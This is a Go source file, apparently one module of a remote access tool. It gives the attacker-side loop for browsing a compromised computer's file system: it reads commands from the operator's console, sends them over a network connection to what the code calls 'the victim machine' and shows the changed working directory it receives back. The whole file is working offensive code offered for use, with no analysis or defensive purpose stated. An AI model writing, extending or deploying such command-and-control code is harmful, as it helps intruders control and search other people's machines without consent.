package move

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
)

func NavigateFileSystem(connection net.Conn) (err error) {

	ConnectionReader := bufio.NewReader(connection)
	initialPwdRaw, err := ConnectionReader.ReadString('\n')
	if err != nil {
		fmt.Println(err)
		return
	}
	initialPwd := strings.TrimSuffix(initialPwdRaw, "\n")

	loopCotrol := true

	for loopCotrol {
		fmt.Print(initialPwd, " >> ")

		// look like this
		// C:\\Windows\go\src\ >> cd ..
		CommandReader := bufio.NewReader(os.Stdin)
		userCommandRaw, err := CommandReader.ReadString('\n')
		if err != nil {
			fmt.Println("[-] Unable read command: ", err)
		}

		nBytes, err := connection.Write([]byte(userCommandRaw))
		if err != nil {
			fmt.Println(err)
		}
		fmt.Println("[+] ", nBytes, " were sent to the victim machine ")

		if userCommandRaw == "stop\n" {
			loopCotrol = false
			break
		}

		newPwd, err := ConnectionReader.ReadString('\n')
		if err != nil {
			fmt.Println(err)
		}
		initialPwd = newPwd

		fmt.Println("[+] Working Directory changed to ", newPwd)
	}
	return
}
